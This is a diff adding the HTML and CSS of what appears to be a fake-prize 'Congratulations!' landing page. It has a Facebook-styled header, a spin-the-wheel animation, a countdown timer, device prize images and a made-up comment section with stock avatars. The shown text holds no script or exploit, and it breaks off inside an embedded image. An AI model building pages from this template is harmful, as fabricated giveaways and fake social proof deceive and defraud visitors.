@@ -1,0 +1,1562 @@
+ <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <base href="">
+  <meta name="referrer" content="never">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Congratulations!</title>
+  <link href="css.css" rel="stylesheet">
+  <link rel="shortcut icon" href="favicon.ico" type="image/ico">
+  <style>
+    @charset "UTF-8";
+    * {
+      box-sizing: border-box
+    }
+    
+    a,
+    abbr,
+    acronym,
+    address,
+    applet,
+    article,
+    aside,
+    audio,
+    b,
+    big,
+    blockquote,
+    body,
+    canvas,
+    caption,
+    center,
+    cite,
+    code,
+    dd,
+    del,
+    details,
+    dfn,
+    div,
+    dl,
+    dt,
+    em,
+    embed,
+    fieldset,
+    figcaption,
+    figure,
+    footer,
+    form,
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    header,
+    hgroup,
+    html,
+    i,
+    iframe,
+    img,
+    ins,
+    kbd,
+    label,
+    legend,
+    li,
+    mark,
+    menu,
+    nav,
+    object,
+    ol,
+    output,
+    p,
+    pre,
+    q,
+    ruby,
+    s,
+    samp,
+    section,
+    small,
+    span,
+    strike,
+    strong,
+    sub,
+    summary,
+    sup,
+    table,
+    tbody,
+    td,
+    tfoot,
+    th,
+    thead,
+    time,
+    tr,
+    tt,
+    u,
+    ul,
+    var,
+    video {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      font-size: 100%;
+      font: inherit;
+      vertical-align: baseline
+    }
+    
+    article,
+    aside,
+    details,
+    figcaption,
+    figure,
+    footer,
+    header,
+    hgroup,
+    menu,
+    nav,
+    section {
+      display: block
+    }
+    
+    ol,
+    ul {
+      list-style: none
+    }
+    
+    table {
+      border-collapse: collapse;
+      border-spacing: 0
+    }
+    
+    body {
+      font-family: 'Source Sans Pro', sans-serif;
+      font-size: 16px;
+      color: #262626;
+      background: #fafafa;
+      line-height: 1.2
+    }
+    
+    .inner-content {
+      padding: 10px
+    }
+    
+    .visually-hidden:not(:focus):not(:active),
+    input[type=checkbox].visually-hidden,
+    input[type=radio].visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      border: 0;
+      padding: 0;
+      white-space: nowrap;
+      -webkit-clip-path: inset(100%);
+      clip-path: inset(100%);
+      clip: rect(0 0 0 0);
+      overflow: hidden
+    }
+    
+    .img-responsive {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto
+    }
+    
+    .visible {
+      display: block
+    }
+    
+    @keyframes bounceIn {
+      0%,
+      100%,
+      20%,
+      40%,
+      60%,
+      80% {
+        animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+      }
+      0% {
+        opacity: 0;
+        transform: scale3d(.3, .3, .3)
+      }
+      20% {
+        transform: scale3d(1.1, 1.1, 1.1)
+      }
+      40% {
+        transform: scale3d(.9, .9, .9)
+      }
+      60% {
+        opacity: 1;
+        transform: scale3d(1.03, 1.03, 1.03)
+      }
+      80% {
+        transform: scale3d(.97, .97, .97)
+      }
+      100% {
+        opacity: 1;
+        transform: scale3d(1, 1, 1)
+      }
+    }
+    
+    .bounceIn {
+      animation-name: bounceIn
+    }
+    
+    @keyframes spin {
+      0% {
+        transform: rotate(0)
+      }
+      90% {
+        transform: rotate(3110deg)
+      }
+      95% {
+        transform: rotate(3108deg)
+      }
+      100% {
+        transform: rotate(3109deg)
+      }
+    }
+    
+    @keyframes spin2 {
+      0% {
+        transform: rotate(3109deg)
+      }
+      90% {
+        transform: rotate(6314deg)
+      }
+      95% {
+        transform: rotate(6312deg)
+      }
+      100% {
+        transform: rotate(6313deg)
+      }
+    }
+    
+    .spinAround {
+      -webkit-animation: 6.6s spin;
+      animation-timing-function: ease;
+      animation-iteration-count: 1;
+      animation-direction: normal;
+      animation-fill-mode: forwards
+    }
+    
+    .spinAround2 {
+      -webkit-animation: 6.6s spin2;
+      animation-timing-function: ease;
+      animation-iteration-count: 1;
+      animation-direction: normal;
+      animation-fill-mode: forwards
+    }
+    
+    .animated {
+      animation-duration: 1s;
+      animation-fill-mode: both
+    }
+    
+    @keyframes rotateIn {
+      0% {
+        transform-origin: center;
+        transform: rotate3d(0, 0, 1, -200deg);
+        opacity: 0
+      }
+      100% {
+        transform-origin: center;
+        transform: none;
+        opacity: 1
+      }
+    }
+    
+    .rotateIn {
+      animation-name: rotateIn
+    }
+    
+    .transparent {
+      opacity: .6
+    }
+    
+    @keyframes rotateSpinner {
+      0% {
+        transform: rotate(0)
+      }
+      100% {
+        transform: rotate(360deg)
+      }
+    }
+    
+    .header {
+      overflow: hidden;
+      background-color: #3c5a96;
+      height: 45px
+    }
+    
+    .header-table {
+      width: 100%
+    }
+    
+    .header-table td {
+      width: 16.6666%;
+      height: 49px
+    }
+    
+    .fb-icon {
+      width: 60px;
+      height: 45px
+    }
+    
+    .fb1 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtCAMAAADFqPh+AAAAP1BMVEUkPG3///8iOmwXMGUwSX6eqL7o6/GttciAjqtdbpMnPm/Q1eCEkq0bNGiTn7elr8T09vjU2uPIz9tuf59VaI7LTA5oAAAAoklEQVRIx+3STQvDIAyAYZOsfrSNs9X//1vnoYy5XBIGgzGfgydfghJ3+4Cbph/DJDAqW0yLEFddzc2DlHWzKYLPOZ9Q/BPA5rRxYOznmS5tt8R3QqpQtqPzXbHFRPWafEAnYuWbizUWLHEJy+gwxAHHm1xtvz3gZordgNMfxs0QB3qTTOsZ91fx1MacCkgLq2JcaxDy7WoVueDQaaHkpunrHjjuC1oPQBl2AAAAAElFTkSuQmCC)
+    }
+    
+    .fb2 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtBAMAAAAAWBV/AAAAIVBMVEU7WZgdLEs0T4c6V5U+XZwgMFEmOWBGX5QyS4AtQnE4VI4wqgljAAAA2ElEQVQ4y+3SPQ/BUBTG8ZOwsD0DwYSIxCbBYLtBvG1XUsGkROIDSHyB2itpxNiBxsd02o49txNb/8lph1+e7VIzNeqlRlm/KD8xE1/naeRPnQoarkEDvaU3UFEy24DDvJF1BGA/4JO5wLxrACtl5FrIJLYI11PAk3nOfOSPI/OQebXUpZfM3QBb37zOL7BTN2DTF3l8Q9lvAzh3BS0+WNYOz3EQOEBYdQ6gLMzviKprAK2E5uyY3fDvJFnHvJeZTlaUZ1vW2k/y7Bql+C5KeoNRxKco6499AfBeOnC0JZQXAAAAAElFTkSuQmCC)
+    }
+    
+    .fb3 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtBAMAAAAAWBV/AAAAJ1BMVEU7WZgeLUw0T4cbKkc6V5U8W5w2THlFYZ4qP2wlOGAsQ3MhMVM/WIoFZeJLAAAAnklEQVQ4y2NQwgsYXPAChlFAMWANhQAcslodYNCEXZplszEYWKtilQ4ShADhpaRLh4bik2bR6EjCI80lbDwJjzSnofAASgtumgwKM0FBa1Ws0lJlaWlpGYLSOQFYpQXbgNLl2dblDNilQWYvrdntgEU6zBgsba3AXoZNmj1tozXQbKC94Vjjq7x5TjkQ4ExKHXAp7NoD8EoHMIwCegAAGRY+21ofDaAAAAAASUVORK5CYII=)
+    }
+    
+    .fb4 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtCAMAAADFqPh+AAAAjVBMVEU7WZjkKTo6V5U0T4f6+vv4+Pn7+/v8/P3x8vVBXZjreYHHz90wR3r///+9xdeTn7pMaKHTLkPo6vDe4urP1eOUpMWdqcBjdp/K0uJwg6o2UYw0ToTj5+zT2OSdq8uEka08UoH76uuuuc6hr8t8kLlfd6pTZo5BV4ZrS33mPUz41df0v8Tvl5xsS33oVmH9zWC1AAABEUlEQVRIx+3SuXaDMBBA0bHQahHA7BizeLez/f/nZRCc1Jq4ScFtpCnekYqB4AXAXgCrf+ax2zi7B9Bhu9RAt/n1x/j7uKXFLAgnAVbb4xstbu+xzfTBxli9f5JiFpZpZIpLpNRmQopHWxtA+44eB/YErh3oL7NYNa5tBD02Qp1gH45NpuhxLGXEqkNeKkRdEiulMGcltURP4nqm2AxVFUnJpfx4Lu2XX6w5lzwbKjw55jhw8JZxp6yu1yZ3V+0fWz7r3FTjB2r/uFjiGByT8cI/TsSUChEzQOymdQL+euHoW4vDPRVnIDC1mJXA2kjkBiiSfI4v7RiJLgEa02tsD2GpdW+ALClsmua2SGC1Wvn7Ad0PEK6nSw7wAAAAAElFTkSuQmCC)
+    }
+    
+    .fb5 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtBAMAAAAAWBV/AAAALVBMVEU7WZg6V5U0T4ccK0o8WppEYZ4kN149W5swRnQbKUYgMVM4VI87U4MwSoAqPmhNqGDoAAAA6ElEQVQ4y2NQwgsYBPEChlFABHBxwSsrvVvcAacsi0bWqowtOKU5Fs+cOXktTulm44yOZOMWHLIVxjmhoTErbQuw27xr1lYHBtdTZiJYpdmbbQKAVITxdeyGZyaCPOW4ErvljJnPIaoScEg/ATsBJo1pOIh0hKjCdHnnIpCXao3bsbtc2Y4FqEjMCkew1k1uLHEpfGyBJVggtprdlr5mbCeCXZp920yrVZbGxtk4tId2Wc4061lspo5De+iJjqOhh43XOuCSDw0HBrqVCp4UxdoMixTswROxTgBfgiwNLcAnzVLCMAooAQDM5UCjrcBPqQAAAABJRU5ErkJggg==)
+    }
+    
+    .fb6 {
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAtBAMAAAAAWBV/AAAAGFBMVEU7WZg9XJw0T4dGYJghMVIbKUYtRHUqP23Co5N9AAAAQElEQVQ4y2NQwgsYRsGAAkEYEMAmy1QOA0XYpMVDYSAcmzSbCwy4YZNmNIYDII/OHkuDgST6ewzhtFGPjQLqAwD8uywvYzUOdAAAAABJRU5ErkJggg==)
+    }
+    
+    .sweet-overlay {
+      position: fixed;
+      background-color: rgba(0, 0, 0, .4);
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      z-index: 10000
+    }
+    
+    .sweet-alert {
+      position: fixed;
+      display: none;
+      background: #fff;
+      border-radius: 5px;
+      box-shadow: 0 14px 37px rgba(33, 33, 33, .7);
+      font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      width: 478px;
+      padding: 17px;
+      text-align: center;
+      left: 50%;
+      top: 35%;
+      margin-left: -256px;
+      margin-top: -150px;
+      overflow: hidden;
+      z-index: 99999
+    }
+    
+    .sweet-alert__visible {
+      display: block
+    }
+    
+    .sweet-alert__title {
+      color: #232f3e;
+      font-size: 25px;
+      text-align: center;
+      font-weight: 600;
+      text-transform: none;
+      position: relative;
+      margin: 10px 0;
+      padding: 0;
+      line-height: 25px;
+      display: block
+    }
+    
+    .sweet-alert p {
+      color: #232f3e;
+      font-size: 15px;
+      font-weight: 400;
+      position: relative;
+      text-align: inherit;
+      float: none;
+      margin-bottom: 10px;
+      padding: 0;
+      line-height: normal
+    }
+    
+    .sweet-alert__btnwrap {
+      display: inline-block;
+      position: relative
+    }
+    
+    .sweet-alert__btn {
+      width: 100%;
+      background-color: #3578e5;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      display: block;
+      text-decoration: none;
+      text-align: center;
+      padding: 10px 32px;
+      border: 0;
+      border-radius: 3px;
+      margin-top: 10px;
+      cursor: pointer
+    }
+    
+    .content {
+      width: 94%;
+      max-width: 614px;
+      margin: 10px auto 0
+    }
+    
+    .content-top {
+      border: 1px solid #e6e6e6
+    }
+    
+    .content-top__wrapper {
+      background: #fff
+    }
+    
+    .content-top__title {
+      font-size: 1.625rem;
+      font-weight: 600;
+      text-align: center;
+      letter-spacing: .5px;
+      color: #3c5a96
+    }
+    
+    .content-top__desc {
+      display: block;
+      color: #262626;
+      font-size: small;
+      text-align: center;
+      font-weight: 600;
+      text-transform: none;
+      position: relative;
+      margin: 12px 0;
+      padding: 0;
+      line-height: 1.4
+    }
+    
+    .content-top__subdesc {
+      font-weight: 600;
+      text-align: center;
+      font-size: small;
+      color: #3c5a96
+    }
+    
+    .content-wrapper {
+      width: 100%;
+      border: 1px solid #e6e6e6
+    }
+    
+    .spin-container {
+      position: relative;
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      overflow: hidden;
+      padding-bottom: 15px;
+      background-color: #fff
+    }
+    
+    .spin-wrapper {
+      position: relative
+    }
+    
+    .spin-prize {
+      left: 12%;
+      top: 70px;
+      position: absolute;
+      max-width: 70%;
+      height: auto;
+      z-index: 3;
+      display: none
+    }
+    
+    @media (min-width:767px) {
+      .spin-prize {
+        left: 25%
+      }
+    }
+    
+    .spin-wheel {
+      z-index: 1;
+      width: 100%;
+      height: auto;
+      margin-top: 5px
+    }
+    
+    .timer-wrap {
+      width: 100%;
+      background-color: #fff
+    }
+    
+    .timer-msg {
+      text-align: center;
+      padding-top: 10px;
+      line-height: 1.4;
+      font-size: .75rem
+    }
+    
+    .new-timer,
+    .timer-count {
+      color: #3578e5
+    }
+    
+    .footer {
+      max-width: 614px;
+      margin: 0 auto;
+      width: 94%;
+      padding: 16px 15px;
+      border-top: 1px solid #efefef
+    }
+    
+    .footer-inc {
+      font-size: .75rem;
+      color: #c7c7c7;
+      text-transform: uppercase
+    }
+    
+    @media screen and (min-width:615px) and (max-width:895px) {
+      .spin-prize {
+        left: 20%;
+        top: 15px
+      }
+    }
+    
+    @media screen and (max-width:499px) {
+      .prize-img {
+        width: 32%
+      }
+      .prize-info {
+        width: 68%;
+        padding-right: 0
+      }
+      .prize-cta {
+        width: 100%;
+        padding-top: 16px
+      }
+      .prize-cta a {
+        padding: 10px
+      }
+    }
+    
+    .fb {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #fff;
+      border: 1px solid #e6e6e6;
+      font-family: Helvetica, 'Helvetica Neue', Arial, sans-serif;
+      font-size: 13px;
+      line-height: 1.3
+    }
+    
+    .fb-top {
+      display: -ms-flexbox;
+      display: flex;
+      -ms-flex-align: center;
+      align-items: center;
+      -ms-flex-pack: justify;
+      justify-content: space-between;
+      padding: 0 1px 12px;
+      border-bottom: 1px solid #e9ebee;
+      font-size: 14px;
+      margin-bottom: 20px
+    }
+    
+    .fb-top>* {
+      display: inline-block;
+      vertical-align: middle
+    }
+    
+    .fb-top__count,
+    .fb-top__title {
+      font-weight: 700
+    }
+    
+    .fb-top__sort {
+      margin: 0 8px
+    }
+    
+    .fb-top__newest {
+      border-radius: 2px;
+      text-decoration: none;
+      font-size: 12px;
+      color: #4b4f56;
+      border: 1px solid #ced0d4;
+      background: #f6f7f9;
+      padding: 6px;
+      line-height: 24px;
+      font-weight: 700;
+      transition: .2s
+    }
+    
+    .fb-top__newest:hover {
+      background: #e9ebee
+    }
+    
+    .fb-form {
+      position: relative;
+      padding: 5px 0 5px 55px;
+      min-height: 60px;
+      font-family: Tahoma, Helvetica, 'Helvetica Neue', sans-serif
+    }
+    
+    .fb-form__img {
+      width: 50px;
+      height: 50px;
+      position: absolute;
+      display: block;
+      top: 5px;
+      left: 0;
+      background: url(data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/2wBDAAIBAQEBAQIBAQIDAgECAwMCAgICAwMDAwMDAwMFAwQEBAQDBQUFBgYGBQUHBwgIBwcKCgoKCgwMDAwMDAwMDAz/2wBDAQICAgQDBAcFBQcKCAcICgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAyADIDAREAAhEBAxEB/8QAHAAAAgIDAQEAAAAAAAAAAAAAAAcFCAIEBgMJ/8QAOBAAAQIFAQYBBw0BAAAAAAAAAQIDAAQFBhETBwgSITFRQTQ1QmFicYEUFiIyMzZDY3KEkZSh8P/EABoBAAIDAQEAAAAAAAAAAAAAAAAFAgMEBgH/xAAnEQACAgECBQMFAAAAAAAAAAAAAQIRAwQxBRIhUYEyQcEiYZHw8f/aAAwDAQACEQMRAD8A+mmqvvHWUJw1V94KAk7YtG67zmzJWzJuTTqcaikBKUIz041rwlOccsmKsmWONXJ0SjBy2Oxn93W76Lbc3cVbmWwZZovCUkm1zLyiPROAgD1kE4HOMsdfCUkkvguenaVsXeqvvG+jOGqvvBQBqr7wUBjABtUOmKrVak6MhXAubfalgrGcF1wIzj4xGcuVN9j2Kt0Wyt23KPalIaodCZSxT2RhKU9VHxUo+Kj4kxzGTI5u2NYxUVSN6IEhBbzVl0e3Lgkq7R2ksCqJeMwy2MI1WSjKwByBUFjOPEZ6kw74dmc4tP2MGpgk7XuLKGJmCAAgAmNnzM1MX1R0SbZdmBOSywhHMkIeSs/wBmKs7ShK+xPH6kWyjmBqEACd3tZeZXLUKbSgmTbVNtrc9ELcDSkpPrIQT8Ia8La+rwY9WthLw3MYQAEAEhalbNtXNT7g4StMnMNTCm0nBWlCwpSQT0yMiIZYc8Wu6JQlTTLbsPszTCJmXUFsOJC0LT0UlQyCPeI5dqhsZx4Ak9624kO1GmWq0DxMoXPPHIxl06SBjuAhR+MOOGY+jl4MWql1SFDDQyBAAQAEAFm9hE9P1HZVSX6ivjcSh1htRAB0mX1stg47JSB7hHO62KWV0MsDuCOvjKXFV9rdQqFR2lVp6pK4nkTb0ujljDTKy00AB7CR7+sdLpYpY412FeV3JnOxeVhABk006+4llhJW8shKUJBJJPIAAQN0B3dm7u9+3OUTFUbFJpZwS5OA6xHssjCs/qKYxZdfCG3Vl8NPKX2LDUyny9Jp0vS5QYlJZtEu0D4IbSEJ/wAEIZS5nYwSpUe8eHor9tmw2rXxWPnVbLzQqGkhp6UeyjULecKS5zGSCBggDl1hlo9Ysa5ZbGXNgcnaErcNqXHak38iuOSdlH8kJ1kkJXjqULH0VD1pJhvjyxmri7McoOO5HxMiOfdf+zd82dXOnnXw6/lwp4j5+P6bNN4+RxwpNgQAEABABD3591pryD6o8++RdfxItwepb+NyGTb28lZP6Hl//ft46L87fvkWH//Z);
+      border: 1px solid #d3d6db
+    }
+    
+    .fb-form__input {
+      border: 1px solid #d3d6db
+    }
+    
+    .fb-form__msg {
+      border-bottom: 1px solid #d3d6db;
+      background: #fafafa;
+      font-size: 11px;
+      padding: 8px;
+      color: #90949c
+    }
+    
+    .fb-form__action {
+      background: #f6f7f9;
+      padding: 8px;
+      text-align: right
+    }
+    
+    .fb-form__action button {
+      background: #3578e5;
+      border: 0;
+      font-size: 12px;
+      font-family: Helvetica, 'Helvetica Neue', sans-serif;
+      border-radius: 2px;
+      line-height: 24px;
+      padding: 0 8px;
+      font-weight: 700;
+      color: #fff;
+      cursor: wait;
+      outline: 0
+    }
+    
+    .fb-comment {
+      padding: 5px 0 5px 60px;
+      margin-top: 5px;
+      position: relative;
+      min-height: 60px;
+      display: none
+    }
+    
+    .fb-comment__ava {
+      width: 50px;
+      height: 50px;
+      position: absolute;
+      display: block;
+      top: 5px;
+      left: 0;
+      border: 1px solid #d3d6db
+    }
+    
+    .fb-comment .details-top__img {
+      max-width: 100%;
+      display: block;
+      border-radius: 10px
+    }
+    
+    .fb-comment .details-bottom {
+      margin-top: 6px;
+      font-family: Tahoma, Helvetica, 'Helvetica Neue', sans-serif;
+      color: #90949c;
+      font-size: 12px;
+      line-height: 16px
+    }
+    
+    .fb-comment .details-bottom>a {
+      color: #3b5998;
+      text-decoration: none
+    }
+    
+    .fb-comment .details-bottom__time {
+      border-bottom: 1px dotted #999;
+      cursor: help
+    }
+    
+    .fb-comment__name {
+      color: #3b5998;
+      font-size: 14px;
+      line-height: 1.4;
+      margin-right: 2px;
+      display: inline-block;
+      vertical-align: middle;
+      font-weight: 700;
+      text-decoration: none
+    }
+    
+    .fb-comment__name:hover {
+      text-decoration: underline
+    }
+    
+    .fb-comment__txt {
+      margin: 4px 0 6px
+    }
+    
+    .fb-like__total {
+      display: inline-block;
+      margin-left: 3px;
+      padding-left: 19px;
+      background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAAVFBMVEUAAAAAf/xGg8YAaPQAZfQAjP8Aov0Agf8Agf3///8Ap/8AZfcAoP8AcfoAgf0Alf8Aif4Amv8AkP7w8vXS6v9grf9qw/4AefuUyf8AWvMtkP8Au/ht9UPFAAAACXRSTlMAUBnNm5Le0niiKsWXAAAAgElEQVQI1zWPWRLDIAhACWYjKm5Rk/b+9yzE5g0DPIYPAAGX9TjWBeFhOv5Mj7lXnTgmp5xfSQlhD0kH1FxKYYEtB6HR1WrIG8SYS8knEZUcIzBHIgnRyAyGmYhVL2YDu+9EXZc/3c+A1tfqBxblDGut9lLGWVYZpuBs7tvM+sIPOmoH7ji7+iYAAAAASUVORK5CYII=) left center/13px 13px no-repeat
+    }
+    
+    .fb-like__total:after {
+      content: " · ";
+      display: inline-block;
+      margin-left: 5px
+    }
+    
+    .fb-like__hide {
+      display: none!important
+    }
+    
+    .fb-load {
+      margin-top: 10px;
+      padding: 10px 0
+    }
+    
+    .fb-load__btn {
+      display: block;
+      width: 100%;
+      color: #fff;
+      text-align: center;
+      background: #3578e5;
+      border: 0;
+      border-radius: 2px;
+      font-weight: 700;
+      padding: 12px;
+      font-size: 14px;
+      font-family: Helvetica, 'Helvetica Neue', Arial, sans-serif;
+      cursor: pointer;
+      outline: 0
+    }
+    
+    .fb-load__progress {
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      outline: 0;
+      background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAAjVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADqhzP4AAAALnRSTlMACSUbvmwXEwQgDgzvqDUCfXRjU1BKPSrp4dnNxLiZlJBnX1pIMi7crqGbgH9GHNpD5AAAAMdJREFUKM+dkdcOgzAMRQsZQFhllL0LdPv/P68iUAlMpUr1y3Vy4hvHOfwf6rNMcmW3bdYwhYn34xSAeidtZ2NB0X+xVzKw12tXX5IH0M1BXZkJT2BEFqY7CYMb9tZk33c4I6BzMUlpOQi4XDZOMxUDQia5XkZsZUjQWD2+PJags44IcIdIoQXZOg3OPE2WbkvU19KNsPP1S4xTpHxSmzJjycUQrMavVrQJYs0UhhP4IV+Va21l10fGPM+PBPqs0GdtF0bk8CPeudcLQN4gQOIAAAAASUVORK5CYII=) 0 0/cover no-repeat
+    }
+    
+    .fb-load__loader {
+      display: none;
+      margin: 0 auto;
+      animation: 1.2s linear infinite rotateSpinner
+    }
+    
+    .fb-legend {
+      color: #3b5998;
+      padding: 0 3px;
+      line-height: 24px;
+      font-size: 11px;
+      font-family: Tahoma, Helvetica, 'Helvetica Neue', Arial, sans-serif
+    }
+    
+    .fb-legend i {
+      margin-bottom: 2px;
+      margin-right: 3px;
+      display: inline-block;
+      vertical-align: middle;
+      background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOBAMAAADtZjDiAAAAFVBMVEUjWZ0jWZv///9hhLjs8PgxYqNTea83Ck/MAAAAAXRSTlOrAeKiBgAAADJJREFUCNdjYBQEAQEGQQgA0ylKENoJSisJotBKShBxFyUXmDgmHWxsbKxkbAqjYfYAAPKICgQIvL5bAAAAAElFTkSuQmCC);
+      width: 15px;
+      height: 15px
+    }
+    
+    .fb-show-comment {
+      display: block
+    }
+    
+    .img-watch {
+      width: 170px;
+      height: 113px;
+      background: url(css_sprites.jpg) -20px -163px
+    }
+    
+    .img-ipad {
+      width: 183px;
+      height: 140px;
+      background: url(css_sprites.jpg) -7px -4px
+    }
+    
+    .img-iphone__box {
+      width: 186px;
+      height: 106px;
+      background: url(css_sprites.jpg) -211px -161px
+    }
+    
+    .img-iphone__hand {
+      width: 184px;
+      height: 105px;
+      background: url(css_sprites.jpg) -213px -9px
+    }
+    
+    .ava-1 {
+      background: url(face_sprites.jpg)
+    }
+    
+    .ava-2 {
+      background: url(face_sprites.jpg) -50px 0
+    }
+    
+    .ava-3 {
+      background: url(face_sprites.jpg) 0 -50px
+    }
+    
+    .ava-4 {
+      background: url(face_sprites.jpg) -50px -50px
+    }
+    
+    .ava-5 {
+      background: url(face_sprites.jpg) -100px 0
+    }
+    
+    .ava-6 {
+      background: url(face_sprites.jpg) -100px -50px
+    }
+    
+    .ava-7 {
+      background: url(face_sprites.jpg) -150px -100px
+    }
+    
+    .ava-8 {
+      background: url(face_sprites.jpg) 0 -150px
+    }
+    
+    .ava-9 {
+      background: url(face_sprites.jpg) -50px -150px
+    }
+    
+    .ava-10 {
+      background: url(face_sprites.jpg) -100px -150px
+    }
+    
+    .ava-11 {
+      background: url(face_sprites.jpg) -100px -100px
+    }
+    
+    .ava-12 {
+      background: url(face_sprites.jpg) -200px 0
+    }
+    
+    .ava-13 {
+      background: url(face_sprites.jpg) -200px -50px
+    }
+    
+    .ava-14 {
+      background: url(face_sprites.jpg) -200px -100px
+    }
+    
+    .ava-15 {
+      background: url(face_sprites.jpg) -150px -150px
+    }
+    
+    .ava-16 {
+      background: url(face_sprites.jpg) -150px -50px
+    }
+    
+    .ava-17 {
+      background: url(face_sprites.jpg) -50px -100px
+    }
+    
+    .ava-18 {
+      background: url(face_sprites.jpg) 0 -100px
+    }
+    
+    .ava-19 {
+      background: url(face_sprites.jpg) -150px -200px
+    }
+    
+    .ava-20 {
+      background: url(face_sprites.jpg) -200px -150px
+    }
+    
+    @media all and (max-width:540px) {
+      .sweet-alert {
+        width: auto;
+        margin-left: 0;
+        margin-right: 0;
+        left: 15px;
+        right: 15px
+      }
+    }
+    
+    #wheel {
+      z-index: 1;
+      width: 100%;
+      height: auto;
+      margin-top: 5px
+    }
+    
+    #pressButton {
+      position: absolute;
+      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACuCAMAAADu6HRXAAAAYFBMVEVHcEzn5+cAAAC8vLwAAAAAAAAhISIAAAD19fUAAADv7+9/f3/Pz89cXF2UlJTj4+Onp6f///82Njb8/Pyjo6PFxcXS0tKsrKy4uLje3t5kZGR+fn5SUlKNjY1ISEicnJwpbVZcAAAAEXRSTlMA+UC3JxJwZv1T95HHgpzbqfjC4hIAAAigSURBVHja3VyJlqsgDB0RKWg3imuXmf//yyfiAoiKVtTzcs5MZ6ot19wkbAk/P/+pBPBggE7kWHjA6QSOhAeeSjkQaQHhgEhwJMK4gEMRdiDSBGEHIg2cWgGHIuwgpAUnRfYnjaiAyKEIOwBpwaknwZEI2500eDIIPBRh+5ImEXa/H4A0ibALY5fdSZMJu1F62500mTBayt6kKYRxQDuTphHGZV/SJMJ8Wou/I2k9wjhnO5JmIGxf0kyE7UmaiTC6o6fJhHlUEQ/tQdoQYXuRBoYI00kD2xJGyAl5tCclaYRsShpvrfxByECYIA3xa2Qr0gDXDBogTCKtAgW28Hg05GF9T0OufT+A8qjepwPiy2N+6M6QAqAMnc2EVXJRbgRuIEFtyoO8QTw0RNrUCDqHM0KYTpoLSEF/QhjRUYn6E8jAle0ICccB6aStaUvG6emZTsjZ1aTWwNY0YXz0GJk+9z1vRvWgO6OTwm5XtL6STNYT3SzgcB1RdjaoCaxLF/JD3pTcMA6LIuVSFCHWsYY+Wo+2Pl3orDSIiyTP/uIszxMueZ7Ff1meFFi5qQ8JrkQXh9MCwmkex3laNDppXnAhLkigWA8SWAMP8jvt4DSLc1URVFVdHmcSpp6WFiDSzSdqIyErW0u8KcNmXlJibu8Koy8X/vSetA2ELJXbGcdUIk/bW8/oG0QanmujfZzESUjtJSzvbz8bLUdEzOoptZNgOktY+QitllQlkaV4Ls3Ap4jzmXCEZvK4aOb+l0WIVP+KcPO9mUeXSZE1T6LSBpbEw6bbKuKE0aXCkkZJ7Do7QkLTuJDlWUi/kTDLmWEwaYEoMA17cPt1y5WUZ9iAKJhn0OeGrpR+L2lD23mOYQMDnjT26BriNc/l2xs2NNhPkmG6juAs6SOC1gZ0XxuPhOhqaUayAUWsxsPoesJqRPKIm9gRdsEO8HSIsM1ipEKYsON0Rb4a1oRl3ywWI0HPwYp4bTwlotr7z5OeJivoWn82pOtLWD9lNKUiyaIRFnyn1IWkwi4xGrdr2CMsSagbqb/4PG7XRJ8oFys7mOxqhUYaGVUQCt0ZkGJG0hIJnNywpHlC3UmSU3VXlIy4GGJuCZNIw8MqAppFs5V6+OGen6m9LJhQUJpTt5JXIYWhgVgENQVhByFaD9hYVZHKma6gJKGuRTQhWdEAY/42CmrbuBs5A9rqaupeQeXUqLKi0GjWRA3SzGFMlKMjU8I1MTJWmXSR0y0kL9QeLTD4mDDpvNgEkHjuzqyhgbGrMDe2CSAmzPra50zLUtjCpIXnpypnhqhYQV68yjG7/8gqQnqxEag+thVjLWcX3fGJGhXTnG4lokPzdSPSTGgjH+v87KYZUaA5/Vi3gddlE8cVc1ok6mz60t1kkr/n7+Px+6p90Hs9ubw+3VLW6/0W2s3LCx3xsfyPKpoRQQ3QfSxMJyUaIa/q/+zxUN+g9P14CEBP/m4bPF6PRzYarK8qIKDadGKejBUCz6f89od4uFJb7xrR0zMAeloAEiHPV92MWNl02cYTV8vznxZQpZmQt/4xAGpRjACq6GA31c2IOvQYWF5oG2v2feKWqvKvh6cDKlG8pwHh6oKnAuq8njfF/oyOFHbfT3VAtDEYGVBaUhxPAhKtMdXvO68fcTLcaMEE6Fm3qAAqjf6XTQGq3QzJ